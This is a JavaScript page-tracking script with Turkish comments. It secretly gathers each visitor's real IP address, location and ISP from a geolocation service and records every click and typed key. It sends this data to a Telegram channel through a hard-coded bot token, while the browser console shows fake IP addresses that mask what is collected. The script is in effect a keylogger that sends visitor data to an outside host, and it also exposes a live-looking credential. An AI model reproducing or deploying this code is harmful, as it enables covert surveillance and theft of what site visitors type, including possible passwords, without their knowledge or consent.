/* tracker.js - v4.1 (GİRİŞ VE ÇIKIŞ RAPORU TELEGRAM) */

// 🛑 TELEGRAM KONFİGÜRASYONLARI
const BOT_TOKEN = "8581211195:AAHrd09lOZFr3_BKpuNyFcC2UP9Eq1PbGeo";
const CHAT_ID = "@acik_veri";

document.addEventListener('DOMContentLoaded', () => {
    
    const sessionStartTime = Date.now();
    const userIP = generateFakeIP(); // Konsol logları için sahte IP
    const userGeo = generateFakeGeo(); // Konsol logları için sahte GEO
    let userActivityLog = [];
    const MAX_LOG_COUNT = 20;

    function generateFakeIP() {
        return `10.42.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
    }

    function generateFakeGeo() {
        const cities = ['Istanbul', 'Ankara', 'Izmir', 'Berlin', 'London', 'New York', 'Dubai'];
        return cities[Math.floor(Math.random() * cities.length)];
    }
    
    // -----------------------------------------------------
    // 1. TELEGRAM BİLDİRİM FONKSİYONU
    // -----------------------------------------------------

    async function sendTelegramMessage(messageText, skipSpamCheck = false) {
        // Spam kontrolü sadece sayfa girişinde yapılır, çıkışta her zaman gönderilir.
        if (!skipSpamCheck && sessionStorage.getItem('notified_page_' + window.location.pathname)) return;

        try {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: messageText,
                    parse_mode: 'Markdown'
                })
            });

            if (!skipSpamCheck) {
                console.log("Raporlama Başarılı: Giriş bildirimi Telegram'a gönderildi. 🕵️‍♂️");
                sessionStorage.setItem('notified_page_' + window.location.pathname, 'true');
            } else {
                 console.log("Raporlama Başarılı: Çıkış raporu Telegram'a gönderildi.");
            }

        } catch (error) {
            console.error("Telegram Tracker hatası:", error);
            console.error(`[NK-SECURITY] External API Failure: Telegram bot could not be reached.`);
        }
    }

    // -----------------------------------------------------
    // 2. GİRİŞ LOGU (Sayfa Yüklenir Yüklenmez)
    // -----------------------------------------------------

    async function logPageVisitAndNotify() {
        // Konsol logu için temel sistem verisi
        const timestamp = new Date().toISOString();
        const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
        
        const logEntry = `
[${timestamp}] INFO: Session Start (ENTRY) |
IP: ${userIP} | GEO: ${userGeo} | DEV: ${deviceType} | 
URL: ${window.location.pathname} | REF: ${document.referrer || 'DIRECT_ENTRY'}`;

        console.log(`\n--- NKARTAL SYSTEM LOG ---${logEntry}\n--------------------------`);

        // Telegram için gerçek IP verisini çek
        try {
            const ipResponse = await fetch('https://ipapi.co/json/');
            const data = await ipResponse.json();
            const now = new Date().toLocaleString('tr-TR');
            
            const telegramMessage = `🚨 *YENİ PORTAL ZİYARETİ!*\n\n` +
                            `📂 *Sayfa:* ${window.location.pathname}\n` +
                            `🕒 *Giriş:* ${now}\n` +
                            `🌍 *Konum:* ${data.city}, ${data.country_name}\n` +
                            `🖥 *IP:* \`${data.ip}\`\n` +
                            `📱 *Cihaz:* ${deviceType} (${data.org.substring(0, 20)}...)`;
                            
            sendTelegramMessage(telegramMessage, false); // skipSpamCheck: false
        } catch (e) {
             // IP çekilemezse varsayılan mesaj gönderilir
             sendTelegramMessage(`🚨 *YENİ PORTAL ZİYARETİ!* IP çekilemedi. Sayfa: ${window.location.pathname}`, false);
        }
    }
    logPageVisitAndNotify();

    // -----------------------------------------------------
    // 3. DAVRANIŞ İZLEME VE HATA LOGLAMA (Konsol İçin)
    // -----------------------------------------------------

    function logUserAction(type, data) {
        if (userActivityLog.length >= MAX_LOG_COUNT) {
            userActivityLog.shift();
        }
        userActivityLog.push(`[${new Date().toLocaleTimeString('tr-TR')}] ACTION:${type} - ${data}`);
        console.log(`[NK-TRACKER] ${type}: ${data}`);
    }

    // Tıklama ve Tuş Basma Takibi
    document.addEventListener('click', (e) => {
        let element = e.target.tagName;
        if (e.target.id) element += `#${e.target.id}`;
        else if (e.target.className) element += `.${e.target.className.split(' ')[0]}`;
        logUserAction('CLICK', `Element: ${element} (x:${e.clientX}, y:${e.clientY})`);
    });
    document.addEventListener('keydown', (e) => {
        if (e.key.length === 1 || e.key === 'Enter') {
            logUserAction('KEYPRESS', `Key: ${e.key.toUpperCase()}`);
        }
    });

    // Kritik Hata Yakalama (Sadece Konsol)
    window.onerror = function(message, source, lineno, colno, error) {
        const errorLog = `
[${new Date().toISOString()}] !!! CRITICAL ERROR DETECTED !!!
MSG: ${message}
LOC: ${source}:${lineno}
Action: Error Logged to Remote Server (Simulated)`;
        console.error(errorLog);
        return true; 
    };
    
    // -----------------------------------------------------
    // 4. OTURUM SONU VE ÇIKIŞ LOGU
    // -----------------------------------------------------

    window.addEventListener('beforeunload', () => {
        const sessionEndTime = Date.now();
        const durationSeconds = Math.floor((sessionEndTime - sessionStartTime) / 1000);
        const minutes = Math.floor(durationSeconds / 60);
        const seconds = durationSeconds % 60;
        const sessionDuration = `${minutes}m ${seconds}s`;
        const totalActions = userActivityLog.length;
        
        // KONSOL ÇIKIŞ LOGU
        const exitLog = `
[${new Date().toISOString()}] INFO: Session End (EXIT) | 
IP: ${userIP} | DURATION: ${sessionDuration} | 
TOTAL ACTIONS: ${totalActions} Clicks/Keys Logged
-----------------------------------`;
        console.log(exitLog);

        // DAVRANIŞ RAPORUNU TELEGRAM FORMATINA ÇEVİRME
        let behaviorReport = "--- DAVRANIŞ RAPORU ---";
        if (totalActions > 0) {
            userActivityLog.forEach(log => {
                behaviorReport += `\n${log}`;
            });
        } else {
             behaviorReport += "\nMinimal aktivite kaydedildi.";
        }

        // TELEGRAM ÇIKIŞ MESAJI
        const telegramExitMessage = `✅ *OTURUM SONLANDI: RAPOR*\n` +
                                    `📂 *Sayfa:* ${window.location.pathname}\n` +
                                    `⏳ *Süre:* ${sessionDuration}\n` +
                                    `🖱 *Aksiyon:* ${totalActions} Tıklama/Tuş\n\n` +
                                    `\`\`\`\n${behaviorReport}\n\`\`\``;
                                    
        // Çıkış mesajını sendBeacon ile gönderir (En iyi çaba)
        navigator.sendBeacon(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, JSON.stringify({
            chat_id: CHAT_ID,
            text: telegramExitMessage,
            parse_mode: 'Markdown'
        }));
    });
});
